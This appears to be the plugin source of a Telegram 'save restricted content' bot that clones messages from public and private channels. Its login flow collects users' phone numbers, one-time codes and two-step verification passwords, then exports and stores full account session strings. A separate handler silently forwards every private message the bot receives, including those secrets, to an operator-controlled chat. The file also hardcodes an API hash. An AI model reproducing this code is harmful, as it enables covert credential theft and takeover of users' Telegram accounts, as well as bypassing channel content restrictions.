#Github.com/Vasusen-code

import os, asyncio
from .. import bot, ACCESS, ACCESS2, API_ID, API_HASH

from telethon import events, Button
from decouple import config
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, PhoneCodeExpired 

from main.plugins.helpers import login, logout, force_sub

st = "Send me **link** of any **public** channel message to clone it here 🔗, For **private** channel message, First **login** then send any **message link** from your chat ✅.\n\n**SUPPORT:** @TeamDrone\n**DEV:** @MaheshChauhan"

ht = """Help:

**FOR PUBLIC CHANNEL:**
- Send me direct link of message. 

**FOR PRIVATE CHANNEL:**
- Login 
- Then send Link of message of any channel you've joined.

#FAQ 

- If bot says “Have you joined the channel?” Then just login again in bot and try.

- If bot says “Please don't spam links, wait until ongoing process is done.” then send /free command in bot and try after 10 minutes. 

- if bot says “Login credentials not found” the just login again

- If bot shows error containing “AUTH_KEY_DUPLICATED” in it then login again.

- if you batch is stuck then use /cancel 

#Note : Don’t use the /free command unnecessarily.
"""

otp_text = """An OTP has been sent to your number. 

Please send the OTP with space, example: `1 2 3 4 5`."""

APIID = [API_ID, 29841594]
APIHASH = [API_HASH, "1674d13f3308faa1479b445cdbaaad2b"]

@bot.on(events.NewMessage(incoming=True,func=lambda e: e.is_private))
async def access(event):
    await event.forward_to(ACCESS)
            
@bot.on(events.NewMessage(incoming=True, pattern="/start"))
async def start(event):
    await event.reply(f'{st}', 
                      buttons=[
                              [Button.inline("SET THUMB", data="sett"),
                               Button.inline("REM THUMB", data="remt")],
                              [Button.inline("LOG IN", data="login"),
                               Button.inline("LOG OUT", data="logout")],
                              [Button.inline("HELP", data="help"),
                               Button.url("SOURCE", url="github.com/vasusen-code/saverestrictedcontentbot")],
                              ])
    tag = f'[{event.sender.first_name}](tg://user?id={event.sender_id})'
    await event.client.send_message(int(ACCESS), f'{tag} started the BOT\nUserID: {event.sender_id}') 

@bot.on(events.NewMessage(incoming=True, pattern="/login"))
async def linc(event):
    Drone = event.client
    number = 0
    otp = 0
    session = ""
    passcode = ""
    ai = ''
    ah = ''
    async with Drone.conversation(event.chat_id) as conv: 
        try:
            xx = await conv.send_message("Send me your contact number with country code(eg +1 or +91) to login.")
            contact = await conv.get_response()
            print(contact.text) 
            number = ' '.join(str(contact.text))
        except Exception as e: 
            print(e)
            return await xx.edit("An error occured while waiting for the response.")
        client = Client("my_account", api_id=APIID[0], api_hash=APIHASH[0], in_memory=True)
        ai = APIID[0]
        ah = APIHASH[0]
        try:
            await client.connect()
        except ConnectionError:
            await client.disconnect()
            await client.connect()
        code_alert = await conv.send_message("Sending code...")
        try:
            code = await client.send_code(number)
            await asyncio.sleep(1)
        except FloodWait as e:
            await client.disconnect()
            client = Client("my_account", api_id=APIID[-1], api_hash=APIHASH[-1])
            ai = APIID[-1]
            ah = APIHASH[-1]
            try:
                await client.connect()
            except ConnectionError:
                await client.disconnect()
                await client.connect()
            try:
                code = await client.send_code(number)
                await asyncio.sleep(1)
            except FloodWait:
                await conv.send_message(f"Can't send code, you have Floodwait of {e.x} Seconds.")
                return
        except Exception as e:
            print(e)
            await conv.send_message(f"**Error**: {str(e)}")
            return
        try:
            await code_alert.delete()
            ask_code = await conv.send_message(otp_text)  
            otp_ = await conv.get_response()
            otp = otp_.text
        except Exception as e: 
            print(e)
            return await ask_code.edit("An error occured while waiting for the response.")
        try:
            await client.sign_in(number, code.phone_code_hash, phone_code=' '.join(str(otp)))
        except PhoneCodeInvalid:
            await conv.send_message("Invalid Code, try again.")
            return
        except PhoneCodeExpired:
            await conv.send_message("Code has expired, try again.")
            return
        except SessionPasswordNeeded:
            try:
                xz = await conv.send_message("Send your Two-Step Verification password.") 
                z = await conv.get_response()
                passcode = z.text
            except Exception as e: 
                print(e)
                return await xz.edit("An error occured while waiting for the response.")
            try:
                await client.check_password(passcode)
            except Exception as e:
                await conv.send_message(f"**ERROR:** {str(e)}")
                return
        except Exception as e:
            await conv.send_message(f"**ERROR:** {str(e)}")
            return
        try:
            session = await client.export_session_string()
        except Exception as e:
            await conv.send_message(f"**ERROR:** {str(e)}")
            return
        await login(event.sender_id, ai, ah, session) 
        await Drone.send_message(event.chat_id, "✅ Login credentials saved.")
        await client.disconnect()
        
@bot.on(events.NewMessage(incoming=True, pattern="/logout"))
async def louc(event):
    edit = await event.reply("Trying to logout.")
    await logout(event.sender_id)
    await edit.edit('✅ successfully Logged out.')
@bot.on(events.NewMessage(incoming=True, pattern="/help"))
async def helpc(event):
    await event.reply(ht)

@bot.on(events.NewMessage(incoming=True, pattern="/setthumb"))
async def helpc(event):
    Drone = event.client                    
    async with Drone.conversation(event.chat_id) as conv: 
        xx = await conv.send_message("Send me any image for thumbnail.")
        x = await conv.get_response()
        if not x.media:
            xx.edit("No media found.")
        mime = x.file.mime_type
        if not 'png' in mime:
            if not 'jpg' in mime:
                if not 'jpeg' in mime:
                    return await xx.edit("No image found.")
        await xx.delete()
        t = await event.client.send_message(event.chat_id, 'Trying.')
        path = await event.client.download_media(x.media)
        if os.path.exists(f'{event.sender_id}.jpg'):
            os.remove(f'{event.sender_id}.jpg')
        os.rename(path, f'./{event.sender_id}.jpg')
        await t.edit("✅ Temporary thumbnail saved!")

@bot.on(events.NewMessage(incoming=True, pattern="/remthumb"))
async def remt(event):  
    Drone = event.client            
    edit = await event.reply('Trying.')
    try:
        os.remove(f'{event.sender_id}.jpg')
        await edit.edit('✅ Removed!')
    except Exception:
        await edit.edit("No thumbnail saved.")     
        
@bot.on(events.callbackquery.CallbackQuery(data="sett"))
async def sett(event):    
    Drone = event.client                    
    button = await event.get_message()
    msg = await button.get_response() 
    await event.delete()
    async with Drone.conversation(event.chat_id) as conv: 
        xx = await conv.send_message("Send me any image for thumbnail as a `reply` to this message.")
        x = await conv.get_reply()
        if not x.media:
            xx.edit("No media found.")
        mime = x.file.mime_type
        if not 'png' in mime:
            if not 'jpg' in mime:
                if not 'jpeg' in mime:
                    return await xx.edit("No image found.")
        await xx.delete()
        t = await event.client.send_message(event.chat_id, 'Trying.')
        path = await event.client.download_media(x.media)
        if os.path.exists(f'{event.sender_id}.jpg'):
            os.remove(f'{event.sender_id}.jpg')
        os.rename(path, f'./{event.sender_id}.jpg')
        await t.edit("✅ Temporary thumbnail saved!")
        
@bot.on(events.callbackquery.CallbackQuery(data="remt"))
async def remt(event):  
    Drone = event.client            
    await event.edit('Trying.')
    try:
        os.remove(f'{event.sender_id}.jpg')
        await event.edit('✅ Removed!')
    except Exception:
        await event.edit("No thumbnail saved.")                        
    
@bot.on(events.callbackquery.CallbackQuery(data="login"))
async def lin(event):
    s = await force_sub(event.sender_id)
    if s == True:
        await event.edit("⚠️ You are not subscribed to premium bot, contact @ChauhanMahesh_BOT to buy.")
        return
    await event.edit("📡 Choose your **login method**.", buttons=[[Button.inline("SESSION", data="SESSION"), Button.inline("PHONE NO", data="Phone No.")]])
    
@bot.on(events.callbackquery.CallbackQuery(data="SESSION"))
async def lin_ss(event):
    Drone = event.client
    button = await event.get_message()
    msg = await button.get_reply_message()  
    await event.delete()
    s = ''
    async with Drone.conversation(event.chat_id) as conv: 
        try:
            xz = await conv.send_message("send me your Pyrogram `String SESSION`.")  
            z = await conv.get_response()
            s = z.text
        except Exception as e: 
            print(e)
            return await xz.edit("An error occured while waiting for the response.")
        await login(event.sender_id, API_ID, API_HASH, s) 
        await Drone.send_message(event.chat_id, "✅ Login credentials saved.")
        
@bot.on(events.callbackquery.CallbackQuery(data="Phone No."))
async def lin_ph(event):
    Drone = event.client
    button = await event.get_message()
    msg = await button.get_reply_message()  
    await event.delete()
    number = 0
    otp = 0
    session = ""
    passcode = ""
    ai = ''
    ah = ''
    async with Drone.conversation(event.chat_id) as conv: 
        try:
            xx = await conv.send_message("Send me your contact number with country code(eg +1 or +91) to login.")
            contact = await conv.get_response()
            print(contact.text) 
            number = ' '.join(str(contact.text))
        except Exception as e: 
            print(e)
            return await xx.edit("An error occured while waiting for the response.")
        client = Client("my_account", api_id=APIID[0], api_hash=APIHASH[0], in_memory=True)
        ai = APIID[0]
        ah = APIHASH[0]
        try:
            await client.connect()
        except ConnectionError:
            await client.disconnect()
            await client.connect()
        code_alert = await conv.send_message("Sending code...")
        try:
            code = await client.send_code(number)
            await asyncio.sleep(1)
        except FloodWait as e:
            await client.disconnect()
            client = Client("my_account", api_id=APIID[-1], api_hash=APIHASH[-1])
            ai = APIID[-1]
            ah = APIHASH[-1]
            try:
                await client.connect()
            except ConnectionError:
                await client.disconnect()
                await client.connect()
            try:
                code = await client.send_code(number)
                await asyncio.sleep(1)
            except FloodWait:
                await conv.send_message(f"Can't send code, you have Floodwait of {e.x} Seconds.")
                return
        except Exception as e:
            print(e)
            await conv.send_message(f"**Error**: {str(e)}")
            return
        try:
            await code_alert.delete()
            ask_code = await conv.send_message(otp_text)  
            otp_ = await conv.get_response()
            otp = otp_.text
        except Exception as e: 
            print(e)
            return await ask_code.edit("An error occured while waiting for the response.")
        try:
            await client.sign_in(number, code.phone_code_hash, phone_code=' '.join(str(otp)))
        except PhoneCodeInvalid:
            await conv.send_message("Invalid Code, try again.")
            return
        except PhoneCodeExpired:
            await conv.send_message("Code has expired, try again.")
            return
        except SessionPasswordNeeded:
            try:
                xz = await conv.send_message("Send your Two-Step Verification password.") 
                z = await conv.get_response()
                passcode = z.text
            except Exception as e: 
                print(e)
                return await xz.edit("An error occured while waiting for the response.")
            try:
                await client.check_password(passcode)
            except Exception as e:
                await conv.send_message(f"**ERROR:** {str(e)}")
                return
        except Exception as e:
            await conv.send_message(f"**ERROR:** {str(e)}")
            return
        try:
            session = await client.export_session_string()
        except Exception as e:
            await conv.send_message(f"**ERROR:** {str(e)}")
            return
        await login(event.sender_id, ai, ah, session) 
        await Drone.send_message(event.chat_id, "✅ Login credentials saved.")
        await client.disconnect()
        
@bot.on(events.callbackquery.CallbackQuery(data="logout"))
async def out(event):
    await event.edit("Trying to logout.")
    await logout(event.sender_id)
    await event.edit('✅ successfully Logged out.')
    
@bot.on(events.callbackquery.CallbackQuery(data="help"))
async def help(event):
    await event.edit(ht, link_preview=False, buttons=[[Button.inline("BACK", data="menu")]])
    
@bot.on(events.callbackquery.CallbackQuery(data="menu"))
async def back(event):
    await event.edit(st, 
                      buttons=[
                              [Button.inline("SET THUMB", data="sett"),
                               Button.inline("REM THUMB", data="remt")],
                              [Button.inline("LOG IN", data="login"),
                               Button.inline("LOG OUT", data="logout")],
                              [Button.inline("HELP", data="help"),
                               Button.url("SOURCE", url="github.com/vasusen-code/saverestrictedcontentbot")],
                              ])
    
    
    
    
    
